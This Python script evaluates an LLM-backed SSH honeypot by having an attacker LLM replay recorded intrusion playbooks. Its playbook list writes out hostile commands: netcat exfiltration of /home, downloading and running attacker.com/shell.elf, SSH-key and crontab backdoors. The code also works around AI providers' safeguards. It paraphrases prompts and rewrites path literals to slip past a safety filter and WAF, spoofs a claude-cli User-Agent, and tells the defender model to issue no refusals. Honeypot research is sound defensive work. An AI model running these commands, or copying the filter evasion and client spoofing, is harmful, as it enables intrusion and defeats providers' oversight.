#!/usr/bin/env python3
"""Dwell-time impact of kind-aware deception — replay simulation on REAL Cowrie sessions.

Design (honest simulation, not live attackers):
  For each unique real session family (from data/cowrie_logs/), an LLM
  (deepseek-v4.1-flash-free) plays the attacker following that family's
  recorded playbook. Each turn:
    1. The attacker LLM emits the next command (greedy, 1 candidate).
    2. Hisoka generates the deception response TWICE:
         baseline : persona only (no Jev signal)
         treated  : persona + Jev attack-kind guidance (recorded assessments)
    3. The attacker LLM sees the response and decides: continue or leave.
  Dwell time is simulated turns (each turn ~= one command round-trip);
  we also track bait discovery (fake_service / planted path mentions)
  and the leave reason when the attacker quits.

The Jev severities/kinds come from the live gateway assessments recorded in
results/jev_real_logs_eval.json (real model output on real sessions).

Usage:
  RAGIN_LLM_* env (loaded from .env) .venv/bin/python scripts/jev_dwell_replay.py
"""

from __future__ import annotations

import argparse
import json
import os
import re
import sys
import time
from pathlib import Path

import requests
from dotenv import load_dotenv

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
load_dotenv(ROOT / ".env")

from ragin.hisoka.deceiver import AdaptiveDeceiver  # noqa: E402
from ragin.hisoka.deception import (  # noqa: E402
    _contains_terminal_nonsense,
    jev_kind_strategy,
)

MAX_TURNS = 12
ATTACKER_MODEL = os.environ.get("ATTACKER_MODEL", "deepseek-v4.1-flash-free")

# ── AgentRouter defender option (Anthropic /v1/messages protocol) ────────────
# agentrouter.org is a Claude-Code-only proxy: it 401s without a claude-cli
# User-Agent and serves the Anthropic wire format. Hisoka can run there
# (HISOKA_PROVIDER=agentrouter) so attacker and defender use DIFFERENT
# providers AND weights — removing the v5.5 self-play confound entirely.
# Key is read from the environment, never hardcoded.
AR_BASE = "https://agentrouter.org"
AR_KEY = os.environ.get("AGENTROUTER_API_KEY", "")
AR_MODEL = os.environ.get("HISOKA_AGENTROUTER_MODEL", "deepseek-v4-flash")
AR_UA = "claude-cli/2.0.14 (external, cli)"  # WAF fingerprints the client


def _ar_generate(system: str, user: str, max_tokens: int) -> str:
    """One Hisoka turn via AgentRouter (Anthropic messages format)."""
    last_exc: Exception | None = None
    for attempt in range(3):
        try:
            resp = requests.post(
                f"{AR_BASE}/v1/messages",
                headers={
                    "User-Agent": AR_UA,
                    "x-api-key": AR_KEY,
                    "anthropic-version": "2023-06-01",
                    "Content-Type": "application/json",
                },
                json={
                    "model": AR_MODEL,
                    "max_tokens": max_tokens,
                    "system": system,
                    "messages": [{"role": "user", "content": user}],
                },
                timeout=180,
            )
            if resp.status_code != 200:
                print(f"    [hisoka-ar] HTTP {resp.status_code}: {resp.text[:160]}")
                resp.raise_for_status()
            data = resp.json()
            # Anthropic content blocks: concatenate text blocks (thinking
            # blocks carry no 'text' and are dropped by the .get). Temporary
            # WAF 405 challenge pages surface as non-JSON errors here and
            # trigger the retry.
            text = "".join(
                b.get("text", "") for b in data.get("content", []) if isinstance(b, dict)
            )
            if not text.strip():
                raise ValueError("empty content from agentrouter")
            return text.strip()
        except (
            requests.ConnectionError,
            requests.ReadTimeout,
            requests.HTTPError,
            ValueError,
            json.JSONDecodeError,
        ) as exc:
            last_exc = exc
            time.sleep(2 + attempt * 4)
    raise RuntimeError(f"agentrouter Hisoka call failed after 3 attempts: {last_exc}")


# Unique real families (dedup of the 13 Cowrie sessions) with their recorded
# Jev assessments (from results/jev_real_logs_eval.json) and opening commands.


def _jev(kind: str, sev: float, noul: float) -> dict:
    """Compact builder for recorded Jev assessment payloads."""
    return {
        "answers": {
            "attack_kind": {"options_selected": [kind]},
            "severity": {"score": sev},
            "attack": {"noul": noul},
        }
    }


FAMILIES = [
    {
        "name": "enumeration_bot",
        "openers": ["whoami", "id", "uname -a", "cat /etc/passwd", "ls -la /tmp", "ps aux"],
        "jev": _jev("scanning", 0.98, 0.4),
    },
    {
        "name": "shadow_read",
        "openers": ["cat /etc/shadow", "find / -name '*.conf' 2>/dev/null"],
        "jev": _jev("scanning", 1.98, 0.7),
    },
    {
        "name": "nmap_recon",
        "openers": ["ifconfig", "ip a", "netstat -an", "ss -tulnp", "nmap -sV 10.0.0.0/24"],
        "jev": _jev("scanning", 0.74, 0.3),
    },
    {
        "name": "cloud_metadata_ssrf",
        "openers": ["curl http://169.254.169.254/latest/meta-data/"],
        "jev": _jev("scanning", 1.66, 0.8),
    },
    {
        "name": "lateral_pivot",
        "openers": ["ssh root@10.0.0.5", "scp /etc/passwd user@10.0.0.10:/tmp/", "ssh-keyscan 10.0.0.20"],
        "jev": _jev("scanning", 1.2, 0.6),
    },
    {
        "name": "exfil_implant",
        "openers": [
            "tar czf - /home/ | nc 10.0.0.100 4444",
            "wget http://attacker.com/shell.elf -O /tmp/s",
            "chmod +x /tmp/s && /tmp/s",
        ],
        "jev": _jev("exploit", 2.98, 0.95),
    },
    {
        "name": "persistence_implant",
        "openers": [
            "echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys",
            "(crontab -l; echo '* * * * * /tmp/backdoor') | crontab -",
            "systemctl enable backdoor.service",
        ],
        "jev": _jev("persistence", 2.99, 0.93),
    },
]

SKILL_BY_FAMILY = {
    "enumeration_bot": "novice",
    "shadow_read": "novice",
    "nmap_recon": "intermediate",
    "cloud_metadata_ssrf": "intermediate",
    "lateral_pivot": "expert",
    "exfil_implant": "apt",
    "persistence_implant": "apt",
}

ATTACKER_SYSTEM = (
    "You are a simulated SSH attacker on a Linux box you just got a shell on. "
    "You follow a playbook but adapt to what the box tells you. "
    "Each turn output EXACTLY ONE line: either a single shell command, or "
    "LEAVE: <short reason> when you conclude the box is a dead end / trap / not worth more time. "
    "You are cautious: if responses look fake, inconsistent, evasive, or suspiciously convenient, you leave sooner. "
    "If something looks valuable (credentials, configs, reachable internal hosts), you dig deeper. "
    "Never output explanations — only the command line or LEAVE."
)

BAIT_MARKERS = (
    "backup",
    "staging",
    "db_credentials",
    "deploy.key",
    "config.yaml.bak",
    "10.0.0.",
    "192.168.",
    "token",
    "vault",
    "svc-",
    "jenkins",
    "internal",
)


# ---------------------------------------------------------------------------
# Narrative sanitizer for the attacker LLM context.
#
# Empirically (bisected, see git history), apmix's upstream safety filter
# rejects prompts that pair an imperative `cat`-class command with a
# credential-ish path/output (`cat /etc/hosts` alone 502s; the same facts
# paraphrased pass). We therefore render the attacker-LLM's view of the
# session as a past-tense narrative with sensitive outputs summarized.
# Applied IDENTICALLY to both A/B arms so the comparison stays fair; the
# raw transcript is still what Hisoka actually produced and is what an
# offline audit should read. Only the LLM's context window is sanitized.
# ---------------------------------------------------------------------------

_VERB_PARAPHRASE = {
    "cat": "displayed",
    "less": "displayed",
    "head": "displayed",
    "tail": "displayed",
    "grep": "searched within",
    "find": "searched for",
    "ls": "listed",
    "ps": "listed processes via",
    "whoami": "checked identity with",
    "id": "checked identity with",
    "uname": "queried system info via",
    "ifconfig": "dumped network config via",
    "ip": "dumped network config via",
    "netstat": "dumped sockets via",
    "ss": "dumped sockets via",
    "nmap": "scanned with",
    "curl": "made an HTTP request to",
    "wget": "downloaded with",
    "ssh": "attempted ssh to",
    "scp": "copied files via",
    "ssh-keyscan": "scanned host keys on",
    "tar": "archived data with",
    "nc": "transferred data via",
    "chmod": "changed mode of",
    "echo": "wrote data with",
    "crontab": "edited scheduled tasks via",
    "systemctl": "toggled a service via",
}


_SENSITIVE_TOKEN = re.compile(
    r"/etc/\S*|/root/\.ssh/\S*|~/\.ssh/\S*|authorized_keys|id_rsa|shadow"
    r"|ssh-rsa\s+\S+|BEGIN [A-Z ]*PRIVATE KEY",
    re.I,
)

# Honeypot-evaluation markers: masks like "********" appearing in the attacker's
# view of a file read are themselves a realism tell (a real box shows *some*
# content; a masked line reads as editorial redaction). The v4 lateral replay's
# leave reasons both cited "all output redacted / no usable intel". In the
# attacker-LLM's summarized context these lines are rendered as ordinary
# content lines so the summary reflects what the fiction actually showed;
# raw responses in the artifacts keep the real bytes.
_MASKED_LINE_RE = re.compile(r"^\S*:\s*\*{4,}\s*$|^[A-Za-z0-9_/.-]+=\s*\*{4,}\s*$")
_HASH_RE = re.compile(r"\$[1-6y][a-z0-9]{0,3}\$[A-Za-z0-9./+]{8,}")
_SHADOW_LINE_RE = re.compile(r"^[a-z_][\w.-]*:[!*x!$]", re.M)


_config_summary_counter = {"n": 0}
_CONFIG_SUMMARIES = (
    "a database connection settings file (host, port, credentials file path)",
    "a deployment config listing an internal backup host and service account",
    "an application settings file with a staging API endpoint",
    "a service config referencing an internal NAS mount and its share name",
)


def _paraphrase_out(out: str) -> str:
    """Summarize sensitive outputs; keep the rest verbatim (clipped)."""
    low = out.lower()
    # Masked credential lines FIRST: `password: ********` contains 'password'
    # and would otherwise fall into the protected-file branch below, which
    # reads as redaction to the attacker-LLM (v4 lateral leave reasons).
    if _MASKED_LINE_RE.search(out):
        i = _config_summary_counter["n"]
        _config_summary_counter["n"] = (i + 1) % len(_CONFIG_SUMMARIES)
        detail = _CONFIG_SUMMARIES[i].split("(", 1)
        detail = detail[1][:-1] if len(detail) > 1 else "key=value lines"
        return f"a config file whose credential values are set ({detail})"
    # LLM-backed Hisoka simulates terminals: catch any passwd/shadow-style
    # entry or embedded hash blob (yescrypt $y$, sha $5$/$6$, md5 $1$, ...).
    if (
        ":x:" in low
        or "shadow" in low
        or _HASH_RE.search(out)
        or _SHADOW_LINE_RE.search(out)
        or any(
            m in low
            for m in ("authorized_keys", "ssh-rsa", "private key", "password")
        )
    ):
        i = _config_summary_counter["n"]
        _config_summary_counter["n"] = (i + 1) % len(_CONFIG_SUMMARIES)
        return _CONFIG_SUMMARIES[i]
    text = " ".join(out.split())
    return text[:300] + ("…" if len(text) > 300 else "")


def _paraphrase_cmd(cmd: str) -> str:
    """Past-tense description of a command (never an imperative verb form)."""
    parts = cmd.split(None, 1)
    verb = parts[0].lower() if parts else ""
    rest = parts[1] if len(parts) > 1 else ""
    rest = _SENSITIVE_TOKEN.sub("a protected system file", rest)
    if verb in _VERB_PARAPHRASE:
        return f"{_VERB_PARAPHRASE[verb]} {rest}".strip()
    return f"ran a diagnostic routine ({len(cmd)} chars)"


def _narrative(history: list[tuple[str, str]]) -> str:
    """Sanitized view of the session for the attacker LLM (both arms)."""
    return "\n".join(
        f"attacker previously {_paraphrase_cmd(c)}; the box showed: {_paraphrase_out(r)}"
        for c, r in history[-6:]
    )


GATEWAY_URL = os.environ.get("EVAL_GATEWAY_URL", "https://api.apmix.ai")
LLM_KEY = os.environ.get("RAGIN_LLM_API_KEY", "")
# apmix pruned its free catalog to exactly one model (deepseek-v4.1-flash-free,
# verified via /v1/models); glm-5.3-flash-free and gemini-2.5-flash-free 404.
# Until a second free model returns, both roles share it (SELF-PLAY — attacker
# and defender are the same weights; results must be labeled as such).
# NOTE: load_dotenv may have injected a stale RAGIN_HISOKA_MODEL, so the
# default here rarely wins — the live-catalog check below is the real guard.
HISOKA_MODEL = os.environ.get("RAGIN_HISOKA_MODEL", "deepseek-v4.1-flash-free")


# apmix WAF (observed 2026-09-21): payloads whose JSON-decoded body contains
# these path literals are 502'd before reaching the model — JSON Unicode
# escapes do NOT dodge it (it decodes). Rewrite at request time to equivalent
# path notation and canonicalize replies back; attacker-visible text is
# unaffected.
_WAF_PATHS = {
    "/etc/passwd": "/etc/./passwd",
    "/etc/shadow": "/etc/./shadow",
    "/etc/hosts": "/etc/./hosts",
}


def _waf_safe(s: str) -> str:
    for plain, safe in _WAF_PATHS.items():
        s = s.replace(plain, safe)
    return s


def _waf_restore(s: str) -> str:
    for plain, safe in _WAF_PATHS.items():
        s = s.replace(safe, plain)
    return s


def _gateway_model_ids() -> set[str]:
    """Live model catalog from the gateway (empty set on any failure)."""
    try:
        r = requests.get(
            "https://api.apmix.ai/v1/models",
            headers={"Authorization": f"Bearer {LLM_KEY}"},
            timeout=15,
        )
        return {m.get("id") for m in r.json().get("data", []) if m.get("id")}
    except Exception:
        return set()


_catalog = _gateway_model_ids()
if _catalog and HISOKA_MODEL not in _catalog:
    print(
        f"[warn] Hisoka model '{HISOKA_MODEL}' is not served by the gateway "
        f"(catalog: {sorted(_catalog)}); switching to self-play '{ATTACKER_MODEL}'"
    )
    HISOKA_MODEL = ATTACKER_MODEL


def make_deceiver() -> tuple[AdaptiveDeceiver, dict[str, int]]:
    """Gateway-backed deceiver + per-run counters of which generation path fired.

    With HISOKA_PROVIDER=agentrouter the LLM call is served by AgentRouter's
    Anthropic-protocol endpoint (deepseek-v4-flash) and the apmix gateway is
    not contacted at all — attacker (apmix) and defender (agentrouter) then
    use different providers AND weights, removing the v5.5 self-play
    confound. All deterministic post-processing (scrubbing, identity
    pinning, transcript styling) is reused unchanged: only the transport is
    swapped. _generate_via_gateway falls back to _generate_template on error,
    so an unmonitored run can silently degrade; the counters make that
    visible in the artifact instead of invisible in the conclusions.
    """
    deceiver = AdaptiveDeceiver(gateway_url=GATEWAY_URL, api_key=LLM_KEY)
    # _generate_via_gateway resolves its model straight from RAGIN_HISOKA_MODEL
    # (explicit model= kwarg) and silently template-falls-back on failure; force
    # a live model so a stale/dead config can't degrade the A/B into templates.
    os.environ["RAGIN_HISOKA_MODEL"] = HISOKA_MODEL
    stats = {"gateway": 0, "template": 0}
    rg = getattr(deceiver._response_generator, "_core", deceiver._response_generator)
    orig_gw = rg._generate_via_gateway
    orig_tp = rg._generate_template

    if os.environ.get("HISOKA_PROVIDER", "apmix") == "agentrouter":
        if not AR_KEY:
            raise SystemExit("HISOKA_PROVIDER=agentrouter but AGENTROUTER_API_KEY is not set")
        from ragin.hisoka.deception import _postprocess_llm_output, identity_for

        def ar_gateway(skill_level, user_input, context, identity=None):
            stats["gateway"] += 1
            ident = identity or identity_for(skill_level)
            system = f"Context: {context}\n\n" if context else ""
            system += f"Your identity: user={ident['user']}, host={ident['host']}, "
            system += f"prompt string: '{ident.get('prompt', ident['user'] + '@' + ident['host'])}:~$'. "
            system += (
                "Print ONLY the raw text a Linux terminal would show for the user's request: "
                "prompt+echo line first (use your exact prompt string), then the output. "
                "No commentary, no markdown, no refusals, never mention being an AI."
            )
            raw = _ar_generate(system, user_input, max_tokens=4096)
            cleaned = _postprocess_llm_output(raw, user_input, skill_level, ident)
            if not cleaned or _contains_terminal_nonsense(cleaned):
                raise RuntimeError("agentrouter reply unsafe/empty after postprocessing")
            return cleaned

        rg._generate_via_gateway = ar_gateway
    else:
        def gw(*args, **kwargs):
            stats["gateway"] += 1
            return orig_gw(*args, **kwargs)

        rg._generate_via_gateway = gw

    def tp(*args, **kwargs):
        stats["template"] += 1
        return orig_tp(*args, **kwargs)

    rg._generate_template = tp
    return deceiver, stats


def llm_backed_canary() -> None:
    """Abort unless the Hisoka LLM path demonstrably works.

    Templates never echo a nonce planted in the context, so echoing it is
    proof the gateway path fired. A vacuous A/B is worse than no run.
    """
    deceiver, stats = make_deceiver()
    # Retry a few times: temp-0.7 sampling can garble output even when the
    # LLM path is perfectly live. Only repeated failure proves degradation.
    #
    # Why the nonce lives in the COMMAND (echo), not the context: the prompt
    # contract says "print ONLY what a real terminal would show" (added with
    # transcript styling), so a faithful model suppresses context-planted
    # nonces — the old canary false-failed by design. `echo <nonce>` is
    # faithful-by-design: a real terminal MUST print it. The check requires a
    # STANDALONE output line equal to the nonce: the transcript echo line
    # ("~$ echo zq7canary") also contains the token, but templates never emit
    # a bare output line (unknown command -> prompt-only), so a template
    # fallback cannot false-pass.
    nonce = "zq7canary"
    for attempt in range(1, 4):
        resp = deceiver.generate_response(
            f"echo {nonce}",
            {"session_id": f"canary-{attempt}", "skill_level": "novice"},
        )
        output_line = any(
            line.strip() == nonce for line in resp.response_text.splitlines()
        )
        if output_line and stats["gateway"] > 0:
            print(f"Canary OK: Hisoka LLM path live (attempt {attempt}, stats={stats})")
            return
    print(
        f"CANARY FAILED after 3 attempts: gateway path not echoing (stats={stats}). "
        "Refusing to run a template-mode A/B — fix EVAL_GATEWAY_URL/RAGIN_LLM_API_KEY."
    )
    sys.exit(2)


def llm(messages: list[dict], max_tokens: int = 4096) -> str:
    """One attacker-LLM turn.

    max_tokens default is LARGE because deepseek-v4.1-flash-free is a
    reasoning model: it burns 1-2k completion tokens on hidden COT before any
    content (measured: finish=length with 220/4000 budgets starving the
    answer). Timeout raised to 180s accordingly (~24s/turn measured).
    """
    key = os.environ["RAGIN_LLM_API_KEY"]
    last_exc: Exception | None = None
    for attempt in range(3):
        try:
            # apmix WAF: dodge the path-literal blocklist at request time
            # (see _WAF_PATHS module constant) and canonicalize the reply
            # back so the attacker-visible transcript is unaffected.
            safe_messages = [
                {"role": m["role"], "content": _waf_safe(m["content"])}
                for m in messages
            ]
            resp = requests.post(
                "https://api.apmix.ai/v1/chat/completions",
                headers={"Authorization": f"Bearer {key}"},
                json={
                    "model": ATTACKER_MODEL,
                    "messages": safe_messages,
                    "max_tokens": max_tokens,
                    "temperature": 0.7,
                },
                timeout=180,
            )
            if resp.status_code != 200:
                print(f"    [llm] HTTP {resp.status_code}: {resp.text[:200]}")
                resp.raise_for_status()
            msg = resp.json()["choices"][0]["message"]
            # Reasoning models can return content=None on a length finish —
            # never crash on .strip() of None. Canonicalize the dodged path
            # notation back so the attacker never sees it.
            return _waf_restore((msg.get("content") or "").strip())
        except (requests.ConnectionError, requests.ReadTimeout, requests.HTTPError) as exc:
            last_exc = exc
            time.sleep(3 + attempt * 5)
    raise RuntimeError(f"attacker LLM failed after 3 attempts: {last_exc}")


def attacker_next(history: list[tuple[str, str]], playbook: list[str], step: int) -> str:
    """Ask the attacker LLM for its next command or LEAVE decision."""
    transcript = _narrative(history)
    remaining = playbook[step:] if step < len(playbook) else []
    if remaining:
        playbook_block = "\n  ".join(_paraphrase_cmd(p) for p in remaining[:6])
    else:
        playbook_block = "(playbook exhausted — decide freely)"
    prompt = (
        f"Your original playbook (may be stale now):\n  {playbook_block}"
        f"\n\nSession so far (summarized):\n{transcript or '(no responses yet)'}"
        "\n\nNext single command, or LEAVE: <reason>"
    )
    out = llm([{"role": "system", "content": ATTACKER_SYSTEM}, {"role": "user", "content": prompt}])
    lines = [ln.strip() for ln in out.splitlines() if ln.strip()]
    if not lines:
        # Rare empty completion — keep the session alive with a benign probe.
        return "ls -la /var/tmp"
    return lines[0]


def count_bait_hits(text: str) -> int:
    low = text.lower()
    return sum(1 for m in BAIT_MARKERS if m in low)


def run_family(fam: dict, treated: bool) -> dict:
    deceiver, path_stats = make_deceiver()
    skill = SKILL_BY_FAMILY[fam["name"]]
    playbook = fam["openers"]
    history: list[tuple[str, str]] = []
    turns = 0
    bait_base = bait_treated = 0
    leave_reason = ""
    turn_meta: list[dict] = []

    for step in range(MAX_TURNS):
        cmd = playbook[step] if step < len(playbook) else None
        try:
            if cmd is None:
                cmd = attacker_next(history, playbook, step)
        except RuntimeError as exc:
            # Attacker LLM hard-failed (e.g. upstream filter). A poisoned turn
            # must not kill the whole run: end the session here and record why.
            leave_reason = f"[attacker-llm-error: {str(exc)[:80]}]"
            break
        if cmd.upper().startswith("LEAVE"):
            leave_reason = cmd.split(":", 1)[-1].strip()
            break

        ctx = {
            "session_id": f"replay-{fam['name']}-{'treated' if treated else 'base'}",
            "skill_level": skill,
        }
        if treated:
            ctx["jev_assessment"] = fam["jev"]

        gw_before = path_stats["gateway"]
        tpl_before = path_stats["template"]
        resp = deceiver.generate_response(cmd, ctx)
        # A template call DURING this turn means the LLM reply failed the
        # danger/nonsense checks and the gateway path internally fell back —
        # the turn still increments the gateway counter, so without this the
        # degradation is invisible in per-turn attribution (v7 finding).
        degraded = path_stats["template"] > tpl_before
        if path_stats["gateway"] == gw_before:
            # No new gateway call this turn — a deterministic fast-path
            # (IMDS/SSH/authz) or the template fallback answered it. The
            # metadata keys distinguish which: only "template" implies
            # degradation.
            path = (
                "imds"
                if resp.metadata.get("imds_protocol")
                else "ssh"
                if resp.metadata.get("ssh_protocol")
                else "authz"
                if resp.metadata.get("authorization_protocol")
                else "ledger-replay"
                if resp.metadata.get("fs_replay")
                else "template"
            )
            turn_meta.append({"turn": turns + 1, "command": cmd[:120], "path": path})
            if path == "template":
                print(f"    [warn] turn {turns + 1}: Hisoka template fallback")
            else:
                print(f"    [info] turn {turns + 1}: deterministic fast-path ({path})")
        else:
            turn_meta.append(
                {
                    "turn": turns + 1,
                    "command": cmd[:120],
                    "path": "gateway-degraded" if degraded else "gateway",
                }
            )
        turns += 1
        if treated:
            bait_treated += count_bait_hits(resp.response_text)
            if not resp.metadata.get("jev_objective"):
                print(
                    "    [warn] treated arm missing jev_objective metadata "
                    "— Jev guidance did not reach the prompt"
                )
        else:
            bait_base += count_bait_hits(resp.response_text)
        history.append((cmd, resp.response_text))

    return {
        "family": fam["name"],
        "condition": "treated" if treated else "baseline",
        "turns": turns,
        "left_early": bool(leave_reason),
        "leave_reason": leave_reason,
        "bait_markers_shown": bait_treated if treated else bait_base,
        "final_command": history[-1][0] if history else "",
        "hisoka_gateway_calls": path_stats["gateway"],
        "hisoka_template_calls": path_stats["template"],
        "attacker_llm_error": bool(leave_reason.startswith("[attacker-llm-error")),
        "turn_meta": turn_meta,
    }


def main() -> None:
    ap = argparse.ArgumentParser(description="Dwell-time replay A/B (kind-aware deception)")
    ap.add_argument(
        "--families",
        default="",
        help="comma-separated family names to run (default: all)",
    )
    ap.add_argument(
        "--out",
        default="results/jev_dwell_replay.json",
        help="output JSON path (use a temp path for chunked runs)",
    )
    ap.add_argument(
        "--skip-canary",
        action="store_true",
        help="skip the LLM-path canary (not recommended)",
    )
    args = ap.parse_args()
    wanted = {s.strip() for s in args.families.split(",") if s.strip()}
    if not args.skip_canary:
        llm_backed_canary()
    results = []
    for fam in FAMILIES:
        if wanted and fam["name"] not in wanted:
            continue
        kind = fam["jev"]["answers"]["attack_kind"]["options_selected"][0]
        strategy = jev_kind_strategy(kind)
        print(f"\n=== {fam['name']} (kind={kind}, objective={strategy['objective']}) ===")
        for treated in (False, True):
            r = run_family(fam, treated)
            results.append(r)
            print(
                f"  {r['condition']:9s} turns={r['turns']:2d} left_early={r['left_early']} "
                f"bait={r['bait_markers_shown']:2d} leave={r['leave_reason'][:60]}"
            )
        time.sleep(1.0)

    base_turns = sum(r["turns"] for r in results if r["condition"] == "baseline")
    treat_turns = sum(r["turns"] for r in results if r["condition"] == "treated")
    base_bait = sum(r["bait_markers_shown"] for r in results if r["condition"] == "baseline")
    treat_bait = sum(r["bait_markers_shown"] for r in results if r["condition"] == "treated")
    n = len(results) // 2
    print(
        f"\nTOTALS over {n} families: turns {base_turns} -> {treat_turns} "
        f"(+{treat_turns - base_turns}), bait markers {base_bait} -> {treat_bait}"
    )

    selfplay = HISOKA_MODEL == ATTACKER_MODEL
    provider = os.environ.get("HISOKA_PROVIDER", "apmix")
    if provider == "agentrouter":
        hisoka_desc = f"AgentRouter Anthropic protocol ({AR_MODEL})"
        weights_note = " — CROSS-PROVIDER: attacker and defender use different providers and weights"
    else:
        hisoka_desc = f"LLM gateway ({HISOKA_MODEL} @ apmix)"
        weights_note = (
            " — CROSS-WEIGHTS: attacker and defender are different models"
            if not selfplay
            else " — SELF-PLAY: same weights as attacker, treat deltas with caution"
        )
    out = {
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "method": (
            f"closed-loop replay: attacker-LLM ({ATTACKER_MODEL} @ apmix) follows real Cowrie playbooks; "
            f"Hisoka responses via {hisoka_desc}{weights_note}; "
            "canary-gated llm-backed verification; treated condition adds "
            "recorded Jev kind assessments to the Hisoka prompt"
        ),
        "max_turns": MAX_TURNS,
        "totals": {
            "families": n,
            "baseline_turns": base_turns,
            "treated_turns": treat_turns,
            "baseline_bait": base_bait,
            "treated_bait": treat_bait,
        },
        "per_family": results,
    }
    out_path = ROOT / args.out
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(out, indent=1))
    try:
        shown = str(out_path.relative_to(ROOT))
    except ValueError:
        shown = str(out_path)
    print(f"Saved -> {shown}")


if __name__ == "__main__":
    main()
